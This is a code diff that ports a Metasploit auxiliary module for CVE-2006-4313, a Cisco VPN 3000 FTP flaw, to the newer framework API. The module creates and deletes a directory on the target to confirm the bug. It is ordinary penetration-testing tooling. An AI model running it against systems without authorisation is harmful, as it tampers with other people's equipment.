@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
@@ -22,22 +17,21 @@ class Metasploit3 < Msf::Auxiliary
         verifies that the directory has been created, then deletes it and verifies deletion
         to confirm the bug.
       },
-      'Author'		=> [ 'patrick' ],
+      'Author'		=> [ 'aushack' ],
       'License'		=> MSF_LICENSE,
       'References'	=>
         [
           [ 'BID', '19680' ],
           [ 'CVE', '2006-4313' ],
-          [ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20060823-vpn3k.shtml' ],
           [ 'OSVDB', '28139' ],
-          [ 'OSVDB', '28138' ],
+          [ 'OSVDB', '28138' ]
         ],
       'DisclosureDate' => 'Aug 23 2006'))
 
     register_options(
       [
         Opt::RPORT(21),
-      ], self.class)
+      ])
   end
 
   def run
@@ -50,21 +44,21 @@ class Metasploit3 < Msf::Auxiliary
 
       print_status("Attempting to create directory: MKD #{test}")
       sock.put("MKD #{test}\r\n")
-      res = sock.get(-1,5)
+      res = sock.get_once(-1,5)
 
       if (res =~/257 MKD command successful\./)
         print_status("\tDirectory #{test} reportedly created. Verifying with SIZE #{test}")
         sock.put("SIZE #{test}\r\n")
-        res = sock.get(-1,5)
+        res = sock.get_once(-1,5)
         if (res =~ /550 Not a regular file/)
           print_status("\tServer reports \"not a regular file\". Directory verified.")
           print_status("\tAttempting to delete directory: RMD #{test}")
           sock.put("RMD #{test}\r\n")
-          res = sock.get(-1,5)
+          res = sock.get_once(-1,5)
           if (res =~ /250 RMD command successful\./)
             print_status("\tDirectory #{test} reportedly deleted. Verifying with SIZE #{test}")
             sock.put("SIZE #{test}\r\n")
-            res = sock.get(-1,5)
+            res = sock.get_once(-1,5)
             print_status("\tDirectory #{test} no longer exists!")
             print_status("Target is confirmed as vulnerable!")
           end
